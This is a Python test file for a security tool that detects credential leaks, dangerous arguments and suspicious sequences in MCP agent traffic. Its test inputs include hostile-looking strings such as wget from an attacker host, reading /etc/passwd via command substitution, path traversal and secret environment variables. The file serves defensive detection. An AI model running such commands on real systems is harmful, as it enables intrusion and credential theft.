"""Tests for runtime MCP traffic patterns."""

from agent_bom.runtime.patterns import (
    CREDENTIAL_PATTERNS,
    DANGEROUS_ARG_PATTERNS,
    SUSPICIOUS_SEQUENCES,
)

# ─── Credential patterns ─────────────────────────────────────────────────────


def test_credential_patterns_not_empty():
    assert len(CREDENTIAL_PATTERNS) > 0


def test_credential_pattern_aws_key():
    _, pattern = next((n, p) for n, p in CREDENTIAL_PATTERNS if "AWS Access" in n)
    assert pattern.search("AKIAIOSFODNN7EXAMPLE")
    assert not pattern.search("NOT_AN_AWS_KEY")


def test_credential_pattern_github():
    _, pattern = next((n, p) for n, p in CREDENTIAL_PATTERNS if "GitHub" in n)
    assert pattern.search("ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij")
    assert not pattern.search("gh_short")


def test_credential_pattern_openai():
    _, pattern = next((n, p) for n, p in CREDENTIAL_PATTERNS if "OpenAI" in n)
    assert pattern.search("sk-abcdefghij1234567890abcdefgh")
    assert not pattern.search("sk-short")


def test_credential_pattern_private_key():
    _, pattern = next((n, p) for n, p in CREDENTIAL_PATTERNS if "Private Key" in n)
    assert pattern.search("-----BEGIN RSA PRIVATE KEY-----")
    assert pattern.search("-----BEGIN PRIVATE KEY-----")
    assert not pattern.search("-----BEGIN PUBLIC KEY-----")


def test_credential_pattern_connection_string():
    _, pattern = next((n, p) for n, p in CREDENTIAL_PATTERNS if "Connection String" in n)
    assert pattern.search("mongodb://user:pass@host/db")
    assert pattern.search("postgres://admin:secret@db:5432/mydb")


# ─── Dangerous argument patterns ──────────────────────────────────────────────


def test_dangerous_patterns_not_empty():
    assert len(DANGEROUS_ARG_PATTERNS) > 0


def test_dangerous_shell_metachar():
    _, pattern = next((n, p) for n, p in DANGEROUS_ARG_PATTERNS if "Shell" in n)
    assert pattern.search("rm -rf ; ls")
    assert pattern.search("echo `whoami`")
    assert pattern.search("$(cat /etc/passwd)")


def test_dangerous_path_traversal():
    _, pattern = next((n, p) for n, p in DANGEROUS_ARG_PATTERNS if "Path traversal" in n)
    assert pattern.search("../../../etc/passwd")
    assert pattern.search("..\\windows\\system32")
    assert not pattern.search("/normal/path/file.txt")


def test_dangerous_command_injection():
    _, pattern = next((n, p) for n, p in DANGEROUS_ARG_PATTERNS if "Command injection" in n)
    assert pattern.search("curl https://evil.com")
    assert pattern.search("wget http://attacker.com/payload")
    assert pattern.search("bash -c 'whoami'")


def test_dangerous_env_var():
    _, pattern = next((n, p) for n, p in DANGEROUS_ARG_PATTERNS if "Environment" in n)
    assert pattern.search("$AWS_SECRET_ACCESS_KEY")
    assert pattern.search("$GITHUB_TOKEN")


# ─── Suspicious sequences ────────────────────────────────────────────────────


def test_suspicious_sequences_not_empty():
    assert len(SUSPICIOUS_SEQUENCES) > 0


def test_sequence_structure():
    for name, patterns, description in SUSPICIOUS_SEQUENCES:
        assert isinstance(name, str)
        assert isinstance(patterns, list)
        assert len(patterns) >= 2
        assert isinstance(description, str)


def test_sequence_names_unique():
    names = [name for name, _, _ in SUSPICIOUS_SEQUENCES]
    assert len(names) == len(set(names))
